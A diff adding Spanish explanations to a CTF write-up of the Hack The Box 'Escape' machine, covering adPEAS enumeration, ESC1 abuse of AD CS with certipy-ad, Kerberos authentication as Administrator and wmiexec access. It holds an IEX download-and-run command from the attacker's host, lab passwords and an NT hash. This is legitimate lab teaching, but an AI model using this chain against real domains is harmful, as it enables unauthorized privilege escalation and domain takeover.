@@ -604,7 +604,9 @@ Info: Establishing connection to remote endpoint
 
 ### DC Enumeration (adPEAS) - Powershell tool to automate Active Directory enumeration
 
+Realizaremos una enumeración del AD a travñes de la herramienta `adPEAS.ps1` que es un script de Powershell (parecido a winPEAS) pero en vez de buscar malas configuraciones de Windows, hace exactamente lo mismo pero en el entorno del AD.
 
+Nos descargaremos el script en nuestro equipo y lo compartiremos a través de un servidor web.
 
 ```bash
 ❯ wget https://raw.githubusercontent.com/61106960/adPEAS/refs/heads/main/adPEAS.ps1
@@ -623,14 +625,42 @@ adPEAS.ps1                                                100%[=================
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
-
-
+Desde el `DC` importaremos en memoria a través de `IEX` el script de `adPEAS.ps1` que estamos compartiendo. Una vez lo dispongamos en memoria, ejecutaremos el `Invoke-adPEAS`.
 
 ```powershell
 *Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> IEX (New-Object Net.WebClient).downloadString("http://10.10.16.3/adPEAS.ps1")
 *Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> Invoke-adPEAS
 ```
+
+En el resultado obtenido, encontramos un servicio de **Active Directory Certificate Services (AD CS)** en el dominio.
+
+* **Nombre de la CA:** `sequel-DC-CA`
+* **Hostname:** `dc.sequel.htb`
+* **IP:** `10.10.11.202`
+* **Fecha de Creación:** `18/11/2022`
+* **NTAuthCertificates:** `True`
+* **Plantillas disponibles:**
+  * UserAuthentication
+  * DirectoryEmailReplication
+  * DomainControllerAuthentication
+  * KerberosAuthentication
+  * EFSRecovery
+  * EFS
+  * DomainController
+  * WebServer
+  * Machine
+  * User
+  * SubCA
+  * Administrator
+
+#### Plantilla vulnerable detectada: `UserAuthentication`
+
+* Tiene el flag `ENROLLEE_SUPPLIES_SUBJECT`, lo que puede permitir falsificar certificados.
+* El usuario `sequel\sql_svc` tiene `GenericAll` sobre la plantilla.
+* El grupo `sequel\Domain Users` puede inscribirse en esta plantilla.
+* **Extended Key Usage:** Client Authentication, Secure Email, Encrypting File System.
+
+Esto podría ser explotable para obtener certificados válidos en el dominio. Podemos profundizar con **Certipy** o **Certify** para ver si es viable.
 
 ```powershell
 [?] +++++ Searching for Active Directory Certificate Services Information +++++
@@ -674,17 +704,23 @@ EnrollmentFlag:				INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
 [+] Enrollment allowed for:		sequel\Domain Users
 ```
 
-
-
 ### Abusing Active Directory Certificate Services (ADCS)
 
+ADCS es el rol que maneja la emisión de certificados para usuarios, equipos y servicios en la red de Active Directory. Este servicio, si está mal configurado, puede presentar vulnerabilidades que los atacantes podrían explotar para elevar privilegios o acceder a información sensible.
 
+Algunas de las posibles vulnerabilidades que puede tener ADCS son:
+
+1. **Delegación de privilegios en la emisión de certificados**: Si ciertos usuarios tienen permisos para emitir certificados para otros, un atacante podría abusar de estos privilegios para obtener permisos elevados.
+2. **Mala configuración en las plantillas de certificados**: Configuraciones incorrectas en las plantillas de certificados podrían permitir que un atacante solicite un certificado en nombre de otro usuario, incluso uno con privilegios elevados.
+3. **NTLM Relaying en HTTP**: Si el ADCS acepta autenticación NTLM en lugar de Kerberos, un atacante podría redirigir las solicitudes para ganar acceso.
+
+Lo primero de todo, para no tener problemas con el `DC`, sincronizaremos la hora de nuestro equipo con la del `DC` a través de `ntpdate`.
 
 ```bash
 ❯ sudo ntpdate -s 10.10.11.202
 ```
 
-
+Ejecutamos `Certipy` con el usuario `sql_svc` para buscar plantillas vulnerables, pero no encontramos ninguna con permisos explotables. Probaremos más adelante con otro usuario para ver si hay alguna plantilla explotable.
 
 ```bash
 ❯ certipy-ad find -u 'sql_svc'@10.10.11.202 -p 'REGGIE1234ronnie' -dc-ip 10.10.11.202 -vulnerable -stdout
@@ -725,7 +761,12 @@ Certificate Authorities
 Certificate Templates                   : [!] Could not find any certificate templates
 ```
 
+Probamos con el usuario `Ryan.Cooper` y esta vez sí encontramos una plantilla vulnerable. Nos apareció la plantilla `UserAuthentication`, que tiene una vulnerabilidad **ESC1** porque:
 
+* **Cualquier usuario del dominio** puede inscribirse.
+* **El solicitante puede definir el subject**, lo que nos permite suplantar identidades.
+* **Soporta autenticación de cliente**, lo que nos puede servir para obtener acceso.
+* **Permite exportar la clave privada**, lo que facilita su uso.
 
 ```bash
 ❯ certipy-ad find -u 'Ryan.Cooper'@10.10.11.202 -p 'NuclearMosquito3' -dc-ip 10.10.11.202 -vulnerable -stdout
@@ -809,11 +850,11 @@ Certificate Templates
 
 ### ESC1 exploitation case with certipy-ad
 
-
+La vulnerabilidad `ESC1` en `ADCS` permite que cualquier usuario del dominio solicite un certificado en su propio nombre y lo use para autenticarse como otro usuario con más privilegios. Esto sucede cuando una plantilla de certificados está configurada de forma insegura, permitiendo que el solicitante defina manualmente el `Subject Alternative Name (SAN)` y que la clave privada sea exportable. Si la plantilla también permite la autenticación de cliente, un atacante puede obtener acceso no autorizado dentro del dominio.
 
 {% embed url="https://kogre.gitbook.io/pentest-notes/windows-pentesting/active-directory/active-directory-certificate-services-adcs#esc1" %}
 
-
+Al explotar ESC1, solicitamos un certificado usando la plantilla vulnerable `UserAuthentication` y configuramos el UPN como `administrator@sequel.htb`. Esto nos permite autenticar como el administrador del dominio. La solicitud fue exitosa, generando un certificado que ahora podemos usar para autenticarnos. El archivo resultante, `administrator.pfx`, contiene la clave privada y el certificado necesario para la autenticación.
 
 ```bash
 ❯ certipy-ad req -u Ryan.Cooper@sequel.htb -p "NuclearMosquito3" -ca sequel-DC-CA -template UserAuthentication -upn administrator@sequel.htb -dc-ip 10.10.11.202
@@ -827,7 +868,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Saved certificate and private key to 'administrator.pfx'
 ```
 
-
+Con el certificado generado, lo usamos para autenticarnos como `Administrator` en el dominio `sequel.htb`. Esto nos permitió obtener un `TGT (Ticket Granting Ticket)` y almacenado en un archivo `ccache` (`administrator.ccache`). Con este ticket, podemos usar herramientas como `impacket`. Además, conseguimos el `NT hash` del administrador, lo que nos abre nuevas posibilidades de explotación dentro del dominio.
 
 ```bash
 ❯ certipy-ad auth -pfx administrator.pfx -username Administrator -domain sequel.htb
@@ -841,7 +882,9 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
 ```
 
+A través del `TGT` obtenido previamente, nos conectamos usando `wmiexec.py` con las credenciales del usuario `Administrator` en el `Domain Controller` de `sequel.htb`. Utilizamos el siguiente comando para autenticar y obtener acceso.
 
+Una vez conectado, verificamos el acceso con el comando `whoami`, que confirmó que estamos autenticados como `sequel\administrator`. Teniendo acceso al `DC`, finalmente logramos visualizar la flag **root.txt**.
 
 ```bash
 ❯ KRB5CCNAME=administrator.ccache wmiexec.py sequel.htb/Administrator@dc.sequel.htb -k -no-pass
@@ -854,5 +897,5 @@ C:\>whoami
 sequel\administrator
 
 C:\>type C:\Users\Administrator\Desktop\root.txt
-fbbbbb4a36374705a42e8563bd1709b7
+fbbbbb4a3************************
 ```
